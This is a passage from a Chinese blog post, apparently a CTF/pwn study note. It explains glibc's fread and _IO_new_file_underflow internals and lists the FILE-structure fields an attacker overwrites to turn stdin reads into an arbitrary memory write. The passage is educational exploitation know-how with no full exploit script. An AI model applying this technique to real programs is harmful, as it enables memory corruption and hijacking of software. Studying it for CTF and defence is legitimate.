<tr>
<td>_IO_write_base</td>
<td>输出缓冲区基地址</td>
</tr>
<tr>
<td>_IO_write_ptr</td>
<td>输出缓冲区已使用的地址</td>
</tr>
<tr>
<td>_IO_write_end</td>
<td>输出缓冲区结束地址</td>
</tr>
</tbody>
</table>
</div>
<p>简述 fread 的执行过程：</p>
<ul>
<li>第一部分是 <code>fp-&gt;_IO_buf_base</code> 为空的情况，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用 <code>_IO_doallocbuf</code> 去初始化指针，建立输入缓冲区</li>
<li>第二部分是输入缓冲区里有输入并且够用，此时将缓冲区里的数据直接拷贝至目标buff</li>
<li>第三部分是输入缓冲区里的数据为空或者是不能满足全部的需求，则调用 <code>__underflow</code> 调用系统调用读入数据到缓冲区，然后再把数据从缓冲区中复制给用户</li>
</ul>
<p>假设我们能过控制输入缓冲区指针，使得输入缓冲区指向想要写的地址，那么在第三步调用系统调用读取数据到输入缓冲区的时候，也就会调用系统调用读取数据到我们想要写的地址，从而实现任意地址写的目的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_underflow _IO_file_underflow</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (fp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN) <span class="comment">/* _flag标志位是否包含_IO_NO_READS */</span></span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) <span class="comment">/* 调用_IO_doallocbuf分配输入缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    _IO_flush_all_linebuffered ();</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="comment">/* _IO_SYSREAD == vtable-&gt;_IO_file_read,程序最终会调用read */</span></span><br><span class="line">    <span class="comment">/* 执行read读取数据到fp-&gt;_IO_buf_base,读入大小为输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count; <span class="comment">/* 更新输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将上述条件综合表述为：</p>
<ul>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code></li>
<li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即 <code>_flag &amp;~ 0x4</code></li>
<li>设置 <code>_fileno</code> 为 0</li>
<li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code> ， <code>_IO_buf_end</code> 为 <code>write_end</code> 且使得 <code>_IO_buf_end-_IO_buf_base</code> 大于fread要读的数据</li>
</ul>
<p>stdin 任意写漏洞的关键就是这几步：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) <span class="comment">/* 利用的前提 */</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>_IO_read_ptr</code> &gt;= <code>_IO_read_end</code> 时，程序就会执行系统调用</li>
<li>然后各种指针都会被更新为 <code>_IO_buf_base</code> </li>
<li>最后执行系统调用向 <code>_IO_buf_base</code> 缓冲区输入数据</li>
</ul>
<p>stdin 任意写漏洞，其实就是通过改写 <code>_IO_buf_base</code> 来控制缓冲区的位置，进而控制键盘输入数据的位置（键盘输入的数据先放入缓冲区，再复制到目标位置）</p>
<p>通常程序不能直接在 <code>_IO_buf_base</code> 中写入数据（如果可以直接写入，那不就可以打hook了吗），而是可以对其进行覆盖，小幅度调节它的位置，然后利用新读入的数据去覆盖 <code>_IO_buf_end</code> 等其他字段，进而控制程序</p>
<hr>
<p>讲起来有点抽象，其实我看 raycp 师傅的博客时就不是很明白，但去把博客上附带的那道例题复现了之后就清晰了不少</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/28/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">333</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">171</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">75:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
